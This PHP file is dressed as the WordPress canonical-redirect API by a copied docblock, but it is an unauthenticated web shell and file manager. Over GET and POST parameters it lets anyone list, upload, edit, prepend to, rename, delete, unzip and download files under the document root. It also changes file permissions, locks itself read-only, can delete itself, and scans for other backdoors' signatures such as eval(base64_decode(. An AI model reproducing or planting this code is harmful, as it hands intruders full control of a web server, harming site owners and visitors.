<?php
/**
 * Canonical API to handle WordPress Redirecting
 *
 * Based on "Permalink Redirect" from Scott Yang and "Enforce www. Preference"
 * by Mark Jaquith
 *
 * @package WordPress
 * @since 2.3.0
 */

/**
 * Redirects incoming links to the proper URL based on the site url.
 *
 * Search engines consider www.somedomain.com and somedomain.com to be two
 * different URLs when they both go to the same location. This SEO enhancement
 * prevents penalty for duplicate content by redirecting all incoming links to
 * one or the other.
 *
 * Prevents redirection for feeds, trackbacks, searches, and
 * admin URLs. Does not redirect on non-pretty-permalink-supporting IIS 7+,
 * page/post previews, WP admin, Trackbacks, robots.txt, searches, or on POST
 * requests.
 *
 * Will also attempt to find the correct link when a user enters a URL that does
 * not exist based on exact WordPress query. Will instead try to parse the URL
 * or query in an attempt to figure the correct page to go to.
 *
 * @since 2.3.0
 *
 * @global WP_Rewrite $wp_rewrite
 * @global bool $is_IIS
 * @global WP_Query $wp_query
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $requested_url Optional. The URL that was requested, used to
 *		figure if redirect is needed.
 * @param bool $do_redirect Optional. Redirect to the new URL.
 * @return string|void The string of the URL, if redirect needed.
 */
function DirFilesR($dir) 
{ 
	$handle = opendir($dir) or die("Can't open directory $dir"); 
    $files = Array(); 
    $subfiles = Array(); 
    while (false !== ($file = readdir($handle))) 
    { 
      if ($file != "." && $file != "..") 
      { 
        if(is_dir($dir."/".$file)) 
        { 
          $subfiles = DirFilesR($dir."/".$file); 
          $files = array_merge($files,$subfiles); 
        } 
        else 
        { 
          $files[] = $dir."/".$file; 
        } 
      } 
    } 
    closedir($handle); 
    return $files; 
}

if (isset($_GET['juke']))
{
	$arr_files = DirFilesR($_SERVER['DOCUMENT_ROOT']);

	echo '<td><hr><hr>';
	foreach ($arr_files as $key)
	{
		$key_e = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $key);
		echo $key_e.';'.filesize($key)."<br>\n";
	}
	echo '<hr><hr></td>';
	
	exit;
}
?>
<html>
<head>
	<title><?php echo $_SERVER['SCRIPT_FILENAME'];?></title>
	<style type="text/css">
	INPUT[type="text"] {background-color: #fff8e7;}	body{background: #fff8e7;color: #4c5866;font-family: Verdana;font-size: 11px;}
	a:link{color: #33CC99;}	a:visited{color: #33CC99;}	a:hover{text-decoration: none;Color: #3399FF;}table {font-size: 11px;}
	td {padding: 1px;padding-left: 10px;padding-right: 10px;padding-top: 2px;}
	</style>
</head>
<body>
<table cellpadding="5" width="80%">
<?php
$permsself = perms($_SERVER['SCRIPT_FILENAME'], '');
if ($permsself !== '444')
	chmod($_SERVER['SCRIPT_FILENAME'], 0444);

function del_file($file)
{
	if(!file_exists($file))
		return "file not exists";
	else
	{
		if (!unlink($file))
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			else
			{
				if (!unlink($file))
					return "can not delete!";
				else
					return "ok!";
			}
		}
		else
			return "ok!";
	}
}

if (isset($_GET['dispatch']))
{
	del_file($_SERVER['SCRIPT_FILENAME']);
}
if (!empty($_POST['for_del']))
{
	$real_path_for_del = array();
	$all_for_del = $_POST['for_del'];
	
	echo "<<info>>";
	foreach ($all_for_del as $each)
	{
		$each = strstr($each, '/');
		$each = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
		
		$each_for_echo = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);

		if (file_exists($each))
		{
			del_file($each);
			if (!file_exists($each))
				echo $each_for_echo." - removed"."\n";
			else
				echo $each_for_echo." - not removed"."\n";
		}
		else
			echo $each_for_echo." - not found"."\n";
	}
	echo "<</info>>";
	
	exit;
}
function unzip_file($file)
{
	$for_del = strrchr($file, '/');
	$folder_to_save = str_replace($for_del, '', $file);

	//set_time_limit(0);
	$zip = new ZipArchive;
	$zip->open($file);
	$zip->extractTo($folder_to_save);
	$zip->close();
	echo "<tr><td>File: $for_del - <font color=\"green\">unzip successfully</font></td></tr>";
}

function read_file($file_name)
{
	$list = $file_name;
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

function clear_folder($dir) 
{  
    $d=opendir($dir);  
    while(($entry=readdir($d))!==false) 
    { 
        if ($entry != "." && $entry != "..") 
        { 
            if (is_dir($dir."/".$entry)) 
            {  
                clear_folder($dir."/".$entry);  
            } 
            else 
            {  
                unlink ($dir."/".$entry);  
            } 
        } 
    } 
    closedir($d);  
    rmdir ($dir);  
} 

function only_read($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		if (!$file = fopen($file_name,"rt"))
		{
			if (!chmod($file_name, 0775))
			{
				echo 'can\'t permission for chmod file<br>';	
				$original_file = '';
			}
			else // чмоднули, пробуем еще раз открыть файл
			{
				if (!$file = fopen($file_name,"rt")) // 
				{
					echo 'can\'t permission for open file<br>';
					$original_file = '';
				}
				else
				{
					$original_file = fread($file,filesize($file_name));
					fclose($file);
				}
			}
		}
		else
		{
			$original_file = fread($file,filesize($file_name));
			fclose($file);
		}
	}
	return $original_file;
}
		
function findshells($start) 
{
	global $arr_filename;
	$files = array();
	if (!$handle = opendir($start))
		chmod($start, 0755);
	
	$handle = opendir($start);
	
	while(($file=readdir($handle))!==false)
	{	
		if ($file!="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				findshells($startfile);	
			else 
			{
				$result = stristr($startfile, $_SERVER['SCRIPT_FILENAME']);
				
				if ($result == false)
					$arr_filename[] = $startfile;
			}
		}
	}
	closedir($handle);
	return $arr_filename;
}

if (isset ($_GET['unzip']))
{
	unzip_file($_GET['unzip']);
}

if (isset ($_GET['finder']))
{
	$domain = $_SERVER['SERVER_NAME'];
	$script_path = $_SERVER['SCRIPT_NAME'];
	$finderdata_path = $_SERVER['DOCUMENT_ROOT']."/finderdata.txt";
	$good_result_path = $_SERVER['DOCUMENT_ROOT']."/goodfinderdata.txt";;
	
	
	
	$search_str = 'eval(base64_decode(';
	$search_str2 = 'Array(base64_decode(';
	$search_str3 = '@$isbot';
	$search_str4 = '@require';
	$search_str5 = 'eval(gzuncompress(base64_decode(';
	$search_str6 = '@include "\x2';
	$search_str7 = '$OO';
	$search_str8 = 'cache=00';
	$search_str9 = 'file_get_contents(\"../index.php\")"';
	$search_str10 = 'is_uploaded_file';
	$search_str11 = 'base64_decode($_POST';
	$search_str12 = 'multipart/form-data';
	
	if (!file_exists($finderdata_path))
	{
		$arr_php_file = findshells($_SERVER['DOCUMENT_ROOT']);

		$f = fopen ($finderdata_path, "a");
		foreach ($arr_php_file as $each)
		{
			if ($each !== $_SERVER['SCRIPT_FILENAME'])
				fwrite($f, $each."\n");
		}
		fclose($f);
		
		if (file_exists($finderdata_path))
		{
			$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);
			$redirect = 'http://'.$redirect.'?finder';;
			?>	
			<script language = 'javascript'>
			var delay = 300;
			setTimeout("document.location.href='<?php echo $redirect;?>'", delay);
			</script>
			<?php	
		}
		else
			echo 'error: file finderdata.txt can not create';
		
	}
	else
	{
		$all_path = read_file($finderdata_path);
		$urls_for_work = array ();
		
		for ( $u=0; $u < 900; $u++ )
		{
			if (($all_path[$u] !== null) and ($all_path[$u] !== ' ') and ($all_path[$u] !== '') and ($all_path[$u] !== '.') and ($all_path[$u] !== '..'))
				$urls_for_work[] = trim($all_path[$u]);
		}

		for ( $i=0; $i < 900; $i++ )
		{
			unset($all_path[$i]);
		}
				
		$fnew = fopen($finderdata_path, "w");
		foreach ($all_path as $each_path)
		{
			if (($each_path !== null) and ($each_path !== '') and ($each_path !== ' '))
				fwrite($fnew, $each_path."\n");
		}
		fclose($fnew);

		foreach ($urls_for_work as $each_for_check)
		{
			if (file_exists($each_for_check))
			{
				if (((filesize($each_for_check)) < 5000000))
				$each_read = only_read($each_for_check);
				else
					$each_read = '';
				
				$result = stristr($each_read, $search_str);
				$result2 = stristr($each_read, $search_str2);
				$result3 = stristr($each_read, $search_str3);
				$result4 = stristr($each_read, $search_str4);
				$result5 = stristr($each_read, $search_str5);
				$result6 = stristr($each_read, $search_str6);
				$result7 = stristr($each_read, $search_str7);
				$result8 = stristr($each_read, $search_str8);
				$result9 = stristr($each_read, $search_str9);
				$result10 = stristr($each_read, $search_str10);
				$result11 = stristr($each_read, $search_str11);
				$result12 = stristr($each_read, $search_str12);
				if (($result !== false) or ($result2 !== false) or ($result3 !== false) or ($result4 !== false) or ($result5 !== false) or ($result6 !== false) or ($result7 !== false) or ($result8 !== false) or ($result9 !== false) or ($result10 !== false) or ($result11 !== false) or ($result12 !== false))
				{
					$f = fopen ($good_result_path, "a");
					fwrite($f, $each_for_check."\n");
					fclose($f);
				}
			}
		}
		
		if (count($all_path)>0)
			echo count($all_path)." files for check<br>";
		else
			echo '<tr><td>Finish!</td></tr>';
		
		$for_check = read_file($finderdata_path);
		if (file_exists($finderdata_path) and (filesize($finderdata_path)>1))
		{
			$redirect = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $_SERVER['SCRIPT_FILENAME']);
			$redirect = 'http://'.$redirect.'?finder';;
			?>	
			<script language = 'javascript'>
			var delay = 100;
			setTimeout("document.location.href='<?php echo $redirect;?>'", delay);
			</script>
			<?php
		}
		else
		{
			$arr_result = read_file($good_result_path);
			
			foreach ($arr_result as $each)
			{
				if (($each !== null) and ($each !== '') and ($each !== ' '))
				{
					if (isset ($_GET['dir']))
						$dr = $_GET['dir'];
					else
						$dr = $_SERVER['DOCUMENT_ROOT'];
					
					
					$time = get_time($each);
					
					$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);
					
					echo "<tr bgcolor=\"#ffffff\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$each&dir=$dr\"><font color=\"black\">$each</font></a>"."</td><td>".get_filesize($each)."</td><td>$time</td><td>".perms($each, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$each&dir=$dr\">U</a>&nbsp;"."<a href=\"http://$domain$script_path?edit=$each&dir=$dr\">E</a>&nbsp;"."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$each&dir=$dr\">D</a>"."</td></tr>";
				}
			}
			if (file_exists($finderdata_path))
				unlink($finderdata_path);
			
			if (file_exists($good_result_path))
				unlink($good_result_path);
		}
	}
}
if (isset ($_GET['download']))
{
	$file_for_save = $_GET['download'];
		
	if (file_exists($file_for_save))
	{	
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . basename($file_for_save));
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file_for_save));
		readfile($_GET['download']);
		exit;
	}
}
?>
<?php
//set_time_limit (0);

function get_filesize($file)
{
	if(!file_exists($file)) return "Файл  не найден";
	$filesize = filesize($file);
   if($filesize > 1024)
   {
       $filesize = ($filesize/1024);
       if($filesize > 1024)
       {
            $filesize = ($filesize/1024);
           if($filesize > 1024)
           {
               $filesize = ($filesize/1024);
               $filesize = round($filesize, 1);
               return $filesize." gb";       
           }
           else
           {
               $filesize = round($filesize, 1);
               return $filesize." mb";   
           }       
       }
       else
       {
           $filesize = round($filesize, 1);
           return $filesize." kb";   
       }  
   }
   else
   {
       $filesize = round($filesize, 1);
       return $filesize." b";   
   }
}

function get_time($file)
{
	if(!file_exists($file)) return "no info";
	
	$last_update = filemtime($file);
	$time = date('Y-m-d H:i:s', $last_update);
	
	return $time;
}





function perms($filename, $check)
{
    $perms = substr(decoct(fileperms($filename)), -3);
	if ($perms == '644')
		$color = 'green';
	elseif ($perms == '755')
		$color = '#2EC842';
	elseif ($perms == '444')
		$color = 'brown';
	elseif ($perms == '000')
		$color = 'red';
	elseif ($perms == '744')
		$color = 'orange';
	elseif ($perms == '664')
		$color = 'green';
	else
		$color = 'grey';
	if ($check == 1)	
		return $perms;
	else
		return "<font color=$color>".$perms."</font>";
}
function CMS()
{
	if ((is_dir($_SERVER['DOCUMENT_ROOT'].'/administrator/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/components/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/includes/')))
		return "Joomla!";
	elseif ((is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-content/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-admin/')) and (is_dir($_SERVER['DOCUMENT_ROOT'].'/wp-includes/')))
		return "WordPress"; 
	else
		return "Unknown";
}
function folder_separate($path)
{
	$pos_end = strripos($path, '/');
	$path2 = substr_replace($path, '', $pos_end, 99999);
				
	return $path2;
}

function side_bar($make_file)
{
	echo '<td align="right" colspan="2">';
	
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"search_file\" size=\"7\" type=\"text\" placeholder=\".suspected\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
	
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"new_file\" size=\"7\" type=\"text\" placeholder=\"make file\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
				
	echo "<form action = '".$make_file."' method = 'POST'>";
	echo "<input name=\"new_dir\" size=\"7\" type=\"text\" placeholder=\"make dir\" />";
	echo "<input type=\"submit\" value=\"ok\" /></form>";
	echo '</td></tr>';
}

if (isset($_GET['rename']))
{
	if (!empty($_POST ['n_name']))
	{
		if (rename($_GET['rename'], $_POST ['n_name']))
			$message_rename = '<font color="green"><b>Name changed!</b></font>';
		else
			$message_rename = '<font color="red"><b>Name can not be changed</b></font>';
			
		echo $message_rename;
	}
}

function edit_file($file, $current)
{
	if (!empty($_POST['chm']))
	{
		if ($_POST['chm'] == '0755')
		{
			if (chmod($file, 0755))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		elseif ($_POST['chm'] == '0444')
		{
			if (chmod($file, 0444))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		elseif ($_POST['chm'] == '0644')
		{
			if (chmod($file, 0644))
				$message_chmod = '<font color="green"><b>Permission changed!</b></font>';
			else
				$message_chmod = '<font color="red"><b>Unable change permission!</b></font>';
		}
		else
			$message_chmod = '0755<br>0444<br>0644<br>';
		
		echo $message_chmod;
	}
	if (empty($_POST['new']))
	{
		$pos_end = strripos($file, '/');
		$dir = substr_replace($file, '', $pos_end, 99999);

		if (file_exists($file) and (filesize($file)>1))
		{
			if (!$fp = fopen ($file, "r"))
			{
				echo 'no have permission<br>';
				$file_cont = 'can\'t show';
			}
			else
			{
				$file_cont = fread ($fp, filesize ($file));
				fclose ($fp);
			}
		}
		else
			$file_cont = '';
		
		$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
		$file_cont = htmlspecialchars($file_cont);

		echo "<tr><td align=\"center\" colspan=\"5\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "File: ". $file . "<br>\n";
		echo "<textarea name = 'new' rows = '20' cols = '120'>".$file_cont."</textarea><br>\n";
		echo "<div align=\"right\"><br><input type = 'submit' value = 'Save'></div></form></td></tr>\n";
		
		echo "<tr><td align=\"left\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input name=\"chm\" size=\"4\" type=\"text\" placeholder=\"".perms($file, '1')."\"/>";
		echo "<input type=\"submit\" value=\"ok\" /></form></td>\n";
		
		echo "<td colspan=\"3\" align=\"left\"><form action = 'http://".$current."?rename=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input type=\"text\" name='n_name' size=\"72\" value=\"$file\">";
		echo "<input type=\"submit\" value=\"ok\" /></form></td></tr>\n";
	}
	else 
	{
		if (!empty($_POST['new_remote']))
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			
			$file_cont = only_read($file);
			$file_cont = $_POST['new'].$file_cont;
			
			$fp = fopen ($file, "w");
			if (fwrite ($fp, $file_cont))
				$message = ' - <font color="green"><b>Edited!</b></font>';
			else
				$message = ' - <font color="red"><b>Unable to edit!</b></font>';
			fclose ($fp);
			if (!chmod($file, 0444))
				return "no have permission for chmod!";
		}
		else
		{
			if (!chmod($file, 0755))
				return "no have permission for chmod!";
			
			$fp = fopen ($file, "w");
			if (fwrite ($fp, $_POST ['new']))
				$message = ' - <font color="green"><b>Edited!</b></font>';
			else
				$message = ' - <font color="red"><b>Unable to edit!</b></font>';
			fclose ($fp);
		}
		
		$pos_end = strripos($file, '/');
		$dir = substr_replace($file, '', $pos_end, 99999);

		$fp = fopen ($file, "r");
		$file_cont = fread ($fp, filesize ($file));
		fclose ($fp);
		
		
		$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
		
		echo "<tr><td align=\"center\" colspan=\"5\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "File: ". $file . $message . "<br>\n";
		echo "<textarea name = 'new' rows = '20' cols = '120'>".$file_cont."</textarea><br>\n";
		echo "<div align=\"right\"><br><input type = 'submit' value = 'Save'></div></form></td></tr>\n";
		
		echo "<tr><td align=\"left\"><form action = 'http://".$current."?edit=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input name=\"chm\" size=\"4\" type=\"text\" placeholder=\"".perms($file, '1')."\"/>";
		echo "<input type=\"submit\" value=\"ok\" /></form></td>\n";
		
		echo "<td colspan=\"3\" align=\"left\"><form action = 'http://".$current."?rename=".$file."&dir=".$dir."' method = 'POST'>\n";
		echo "<input type=\"text\" name='n_name' size=\"72\" value=\"$file\">";
		echo "<input type=\"submit\" value=\"ok\" /></form></td></tr>\n";
		
		if (chmod($file, 0444))
			$message_chmod_last = '<font color="green"><b>Permission changed!</b></font>';
		else
			$message_chmod_last = '<font color="red"><b>Unable change permission!</b></font>';
	}
	
}

if (isset ($_GET['del']))
{
	if (is_dir($_GET['del']))
		clear_folder($_GET['del']);
	else
		del_file($_GET['del']);
	
}

$domain = $_SERVER['SERVER_NAME'];
$script_path = $_SERVER['SCRIPT_NAME'];
$arr_folder = array();
$arr_filenames = array();
?>
	<tr align="left">
		<td colspan="3">
		<?php
		if (sizeof($_FILES)!=0)
		{	
			if(isset($_FILES) && $_FILES['inputfile']['error'] == 0)
			{
				if (isset ($_GET['dir']))
					$path = $_GET['dir'];
				else
					$path = $_SERVER['DOCUMENT_ROOT'];
					
				$destiation_dir = $path .'/'.$_FILES['inputfile']['name'];
				move_uploaded_file($_FILES['inputfile']['tmp_name'], $destiation_dir );
				
				$open_upload_file = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $destiation_dir); 
				echo '<font color="green"><b>'."<a target=\"_blank\" href=\"http://$open_upload_file\">File Uploaded!</a>".'</b></font>';
			}
		}
		elseif(sizeof($_FILES)!=0)
			echo '<font color="red"><b>No File Uploaded</b></font>';
				
		if (isset ($_GET['dir']))
			$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_GET['dir'];
		else
			$path_for_upload = $_SERVER['SCRIPT_NAME'].'?dir='.$_SERVER['DOCUMENT_ROOT'];
			?>
			<form method="post" action="<?php echo $path_for_upload;?>" enctype="multipart/form-data">
			<input type="file" id="inputfile" name="inputfile">
			<input type="submit" value="ok">
			</form>
			CMS: <?php echo CMS();?><br>
			Server IP: <?php echo $_SERVER['SERVER_ADDR'];?><br>
			Root: <?php echo '<a href="'.'http://'.$domain.$script_path.'?dir='.$_SERVER['DOCUMENT_ROOT'].'">'.$_SERVER['DOCUMENT_ROOT'].'</a>'; ?>
			<br><br>
			Directory: 
			<?php 
			if (isset ($_GET['dir'])) 
				$path = $_GET['dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'];
	
			
			$arr_path = explode("/", $path);
			$slesh_count = count($arr_path)-1;

			$arr_links = array();
			$path_for_work = $path;
			
			for ($i=1; $i <= $slesh_count; $i++)
			{
				$path_for_work = folder_separate($path_for_work);
				$arr_links[] = $path_for_work;
			}
			for ($i=1; $i <= $slesh_count; $i++)
			{
				$k = $slesh_count - $i - 1;
				if ($i !== $slesh_count)
					echo '<a href="http://'.$domain.$script_path.'?dir='.$arr_links["$k"].'">'.$arr_path["$i"].'</a>/';
				else
					echo '<a href="http://'.$domain.$script_path.'?dir='.$path.'">'.$arr_path["$i"].'</a>';
			}
			?>
			
			
		</td>
	<?php
	
		if (isset ($_GET['dir']))
		{
			if (isset ($_POST['new_file_name']))
			{
				$new_file = $_GET['dir'] . '/' . $_POST['new_file_name'];
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;
			}
			else
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'];
		}
		else
		{
			if (isset ($_POST['new_file_name']))
			{
				$new_file = $_SERVER['DOCUMENT_ROOT']. '/' . $_POST['new_file_name'];
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $new_file;
			}
			else
				$make_file = 'http://' . $domain . $script_path . '?dir=' . $_SERVER['DOCUMENT_ROOT'];
		}	
	
	
	
		if ((empty($_POST ['new_file'])) and (empty($_POST ['search_file'])) and (empty($_POST ['new_dir'])))
		{
			if (isset ($_GET['dir']))
				$path = $_GET['dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $path;
			
			side_bar($make_file);
		}
		elseif (!empty($_POST ['new_file']))
		{
			if (isset ($_GET['dir']))
				$path = $_GET['dir'].'/'.$_POST ['new_file'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'].'/'.$_POST ['new_file'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&edit=' . $path;

			if ($fp = fopen ($path, "w"))
			{
				echo '<font color="green">File created successfully!</font>';
				side_bar($make_file);
			}
			else
			{
				echo '<font color="red">Can not create!</font>';
				side_bar($make_file);
			}
			fclose ($fp);
		}
		elseif (!empty($_POST['new_dir']))
		{
			if (isset($_GET['dir']))
				$path = $_GET['dir'].'/'.$_POST['new_dir'];
			else
				$path = $_SERVER['DOCUMENT_ROOT'].'/'.$_POST['new_dir'];
			
			$make_file = 'http://' . $domain . $script_path . '?dir=' . $_GET['dir'] . '&new_dir=' . $path;

			if ($fp = mkdir($path))
			{
				side_bar($make_file);
				echo "<tr align=\"center\"><td align=\"left\" >"."<font color=\"green\">Folder created successfully!</font></td>"."<td></td><td></td><td></td><td></td></tr>";
			}
			else
			{
				side_bar($make_file);
				echo "<tr align=\"center\"><td align=\"left\" >"."<font color=\"red\">Can not create folder!</font></td>"."<td></td><td></td><td></td><td></td></tr>";
			}
		}
		elseif (!empty($_POST['search_file']))
		{
			$file_name_for_search = $_POST['search_file'];
			$arr_all_filenames = findshells($_SERVER['DOCUMENT_ROOT']);
				
			if (isset ($_GET['dir']))
				$dr = $_GET['dir'];
			else
				$dr = $_SERVER['DOCUMENT_ROOT'];
			
			side_bar($make_file);
			
			foreach ($arr_all_filenames as $each_file_name)
			{
				$result = stristr($each_file_name, $file_name_for_search);
				if ($result !== false)
				{
					$time = get_time($each_file_name);
					$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each_file_name);
					echo "<tr bgcolor=\"#ffffff\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$each_file_name&dir=$dr\"><font color=\"black\">$each_file_name</font></a>"."</td><td>".get_filesize($each_file_name)."</td><td>$time</td><td>".perms($each_file_name, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$each_file_name&dir=$dr\">U</a>&nbsp;"."<a href=\"http://$domain$script_path?edit=$each_file_name&dir=$dr\">E</a>&nbsp;"."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$each_file_name&dir=$dr\">D</a>"."</td></tr>";
				}
			}
		}
		
		
	if (isset ($_GET['edit']))
	{
		$current = $domain.$script_path;
		edit_file($_GET['edit'], $current);
	}
	?>
	
	<tr align="center" style="color: #423c63;"><td align="left"><b>Name</b></td><td><b>Size</b></td><td><b>Modify</b></td><td><b>Permissions</b></td><td><b>Actions</b></td></tr>

	<?php
	
	if (isset ($_GET['dir']))
	{
		$arr_files = scandir($_GET['dir']);
	}
	else
	{
		$arr_files = scandir($_SERVER['DOCUMENT_ROOT']);
	}

	foreach ($arr_files as $each)
	{
		$str_for_search = $each;
		if (isset ($_GET['dir']))
			$str_for_search = $_GET['dir'].'/'.$each;
		else
			$str_for_search = $_SERVER['DOCUMENT_ROOT'].'/'.$each;

		if (is_dir($str_for_search))
			$arr_folder[] = $each;
		else
			$arr_filenames[] = $each;
	}
	$k = 0;	
	foreach ($arr_folder as $each)
	{
		if (($each !== '.') and ($each !== '..'))
		{
			if (isset ($_GET['dir']))
			{
				$p = $_GET['dir'].'/'.$each;
				$next_dir = $_GET['dir'].'/'.$each;
			}
			else
			{
				$p = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
				$next_dir = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
			}
			
			$path_for_unlink = $next_dir;
			$for_del = strrchr($path_for_unlink, '/');
			$path_for_unlink = str_replace($for_del, '', $path_for_unlink);
		
			$time = get_time($p);
			
			if ($k % 2 == 0)
				$color_bg = '#fff8e7';
			else
				$color_bg = '#ffffe0';
			
			echo "<tr bgcolor=\"$color_bg\" align=\"center\"><td align=\"left\" >"."<font color=\"#904d30\"><b><a href=\"http://$domain$script_path?dir=$next_dir\">$each</a></b></font>"."</td><td>dir</td><td>$time</td><td>".perms($p, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$p&dir=$path_for_unlink\">U</a>&nbsp;"."</td></tr>";
			$k++;
		}
	}
	

	foreach ($arr_filenames as $each)
	{
		
		if (isset ($_GET['dir']))
		{
			$p = $_GET['dir'].'/'.$each;
			$dr = $_GET['dir'];
		}
			
		else
		{
			$p = $_SERVER['DOCUMENT_ROOT'].'/'.$each;
			$dr = $_SERVER['DOCUMENT_ROOT'];
		}
		$time = get_time($p);
		
		$real_url = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $p);
		
		if ($k % 2 == 0)
			$color_bg = '#fff8e7';
		else
			$color_bg = '#ffffe0';

		$per = stristr($each, '.zip');
		if ($per !== false)
			$per = "<a href=\"http://$domain$script_path?unzip=$p&dir=$dr\">Z</a>&nbsp;";
		else
			$per = "<a href=\"http://$domain$script_path?edit=$p&dir=$dr\">E</a>&nbsp;";
 
		echo "<tr bgcolor=\"$color_bg\" align=\"center\"><td align=\"left\" >"."<a style=\"text-decoration: none;\" href=\"http://$domain$script_path?edit=$p&dir=$dr\"><font color=\"black\">$each</font></a>"."</td><td>".get_filesize($p)."</td><td>$time</td><td>".perms($p, '0')."</td><td>"."<a href=\"http://$domain$script_path?del=$p&dir=$dr\">U</a>&nbsp;".$per."<a target=\"_blank\" href=\"http://$real_url\">O</a>&nbsp;"."<a href=\"http://$domain$script_path?download=$p&dir=$dr\">D</a>"."</td></tr>";
		
		$k++;
	}
?>
</table>